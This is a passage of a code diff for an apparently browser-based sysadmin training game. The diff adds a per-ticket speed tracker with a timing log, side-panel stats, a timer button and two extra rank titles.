+  const slowest = times.reduce((a, r) => r.ms > a.ms ? r : a);
+  const hintsUsed = times.reduce((a, r) => a + (r.hints || 0), 0);
+  if (!ctx) return;
+  ctx.out('SPEED TRACKER LOG\n');
+  ctx.out('TICKET       TIME     HINTS  TITLE\n');
+  for (let i = 0; i < times.length; i++) { const r = times[i]; ctx.out(`${(r.ticket || ('#' + (i + 1))).padEnd(12)} ${fmtDur(r.ms).padStart(7)}  ${String(r.hints || 0).padStart(5)}  ${r.title}\n`); }
+  ctx.out('\n');
+  ctx.out(`Tickets timed : ${times.length}\n`);
+  ctx.out(`Total time    : ${fmtDur(total)}\n`);
+  ctx.out(`Average       : ${fmtDur(avg)}\n`);
+  ctx.out(`Fastest       : ${fmtDur(fastest.ms)}  (${fastest.title})\n`);
+  ctx.out(`Slowest       : ${fmtDur(slowest.ms)}  (${slowest.title})\n`);
+  ctx.out(`Hints used    : ${hintsUsed}\n`);
+}
 function completeMission() {
   const m = MISSIONS[S.mission], gain = rewardFor(m);
   S.xp += gain; S.done.push(m.id);
-  emitSys(`<b>✓ ${ticketId(S.mission)} resolved</b> · ${esc(m.title)} · +${gain} XP`, 'ok');
+  let timeStr = '';
+  if (S.tracker && S.missionStart) {
+    const ms = Date.now() - S.missionStart; const hn = S.hints[m.id] || 0;
+    S.times = S.times || []; S.times.push({ ticket: ticketId(S.mission), id: m.id, ch: m.ch, title: m.title, ms, hints: hn, at: Date.now() });
+    S.missionStart = null; timeStr = ` · <span class="pu">${fmtDur(ms)}</span>`;
+  }
+  emitSys(`<b>✓ ${ticketId(S.mission)} resolved</b> · ${esc(m.title)} · +${gain} XP${timeStr}`, 'ok');
   S.mission++;
   const next = MISSIONS[S.mission];
   if (!next || next.ch !== m.ch) emitSys(md(CHAPTERS[m.ch].outro), 'ok');
@@ -4282,6 +4642,7 @@ function startMission() {
   S.readM = []; S.cmdsM = []; S.nudged = [];
   const m = MISSIONS[S.mission], prev = MISSIONS[S.mission - 1];
   if (m.onStart) m.onStart();
+  trackStart();
   S.checkpoint = JSON.stringify(S.fs);
   if (!prev || prev.ch !== m.ch) emitSys(`<span class="chap">${CHAPTERS[m.ch].label}</span>${CHAPTERS[m.ch].name}`, 'chapter');
   announceMission();
@@ -4360,7 +4721,7 @@ document.querySelectorAll('.key').forEach(b => b.addEventListener('click', () =>
 }));
 
 /* ---------- side panel ---------- */
-const RANKS = [[0, 'Intern'], [4, 'Junior Admin'], [9, 'Sysadmin'], [14, 'Incident Lead'], [21, 'Security Lead'], [27, 'Platform Engineer'], [33, 'Reliability Lead'], [41, 'Staff SRE'], [53, 'Principal SRE'], [63, 'Automation Lead'], [73, 'Distinguished Engineer'], [84, 'Systems Architect'], [100, 'Kernel Whisperer'], [120, 'Grandmaster Admin'], [140, 'Legend of Halcyon']];
+const RANKS = [[0, 'Intern'], [4, 'Junior Admin'], [9, 'Sysadmin'], [14, 'Incident Lead'], [21, 'Security Lead'], [27, 'Platform Engineer'], [33, 'Reliability Lead'], [41, 'Staff SRE'], [53, 'Principal SRE'], [63, 'Automation Lead'], [73, 'Distinguished Engineer'], [84, 'Systems Architect'], [100, 'Kernel Whisperer'], [120, 'Grandmaster Admin'], [140, 'Legend of Halcyon'], [160, 'Incident Commander'], [180, 'Chief Incident Commander']];
 const rankName = () => RANKS.filter(r => S.done.length >= r[0]).pop()[1];
 function render() {
   $('#xp').textContent = S.xp;
@@ -4380,6 +4741,27 @@ function render() {
     leds.appendChild(g);
   });
   $('#doneCount').textContent = `${S.done.length} of ${MISSIONS.length} tickets resolved`;
+  const bt = $('#btnTimer'); if (bt) bt.classList.toggle('on', !!S.tracker);
+  const cs = $('#clockStat'); if (cs) cs.hidden = !(S.tracker && !S.finished);
+  const sp = $('#speed'); const times = S.times || [];
+  if (sp) {
+    sp.hidden = !(S.tracker || times.length);
+    if (!sp.hidden) {
+      const total = times.reduce((x, r) => x + r.ms, 0);
+      const best = times.length ? times.reduce((x, r) => r.ms < x.ms ? r : x) : null;
+      $('#spdCount').textContent = times.length ? `${times.length} timed` : (S.tracker ? 'on' : '');
+      let html = '';
+      if (S.tracker && !S.finished) html += `<div class="spd-live" id="spdLive">${S.missionStart ? fmtDur(Date.now() - S.missionStart) : '0:00'}</div><div class="spd-hint">time on this ticket</div>`;
+      if (times.length) {
+        html += `<div class="spd-row"><span>Tickets timed</span><span class="sv">${times.length}</span></div>`;
+        html += `<div class="spd-row"><span>Total time</span><span class="sv">${fmtDur(total)}</span></div>`;
+        html += `<div class="spd-row"><span>Average</span><span class="sv">${fmtDur(total / times.length)}</span></div>`;
+        if (best) html += `<div class="spd-row"><span>Fastest</span><span class="sv">${fmtDur(best.ms)}</span></div>`;
+        html += `<div class="spd-hint">Type <code>stats</code> for the full log.</div>`;
+      } else if (S.tracker) { html += `<div class="spd-hint">Resolve a ticket to start your log.</div>`; }
+      $('#speedBody').innerHTML = html;
+    }
+  }
   const chips = $('#chips'); chips.innerHTML = '';
   if (!S.learned.length) chips.innerHTML = '<p class="empty">Commands appear here as you use them.</p>';
   [...S.learned].sort().forEach(c => {
@@ -4414,6 +4796,7 @@ function render() {
 }
 $('#btnHint').addEventListener('click', () => { showHint(); scrollEnd(); });
 $('#btnRetry').addEventListener('click', () => { doRetry(); scrollEnd(); });
+$('#btnTimer').addEventListener('click', () => { toggleTracker(); scrollEnd(); tin.focus({ preventScroll: true }); });
 let newTimer = null;
 $('#btnNew').addEventListener('click', e => {
   const b = e.currentTarget;
@@ -4442,6 +4825,8 @@ function boot(restored) {
     startMission();
   } else if (restored) { if (!S.finished) { const m = MISSIONS[S.mission]; emitSys(`<span class="chap">${CHAPTERS[m.ch].label}</span>${CHAPTERS[m.ch].name}`, 'chapter'); } announceMission(); }
   else startMission();
+  if (S.tracker && !S.finished) S.missionStart = Date.now();
+  ensureClock();
   updatePrompt(); render(); save(); scrollEnd();
   if (window.matchMedia && matchMedia('(pointer:fine)').matches) tin.focus({ preventScroll: true });
 }
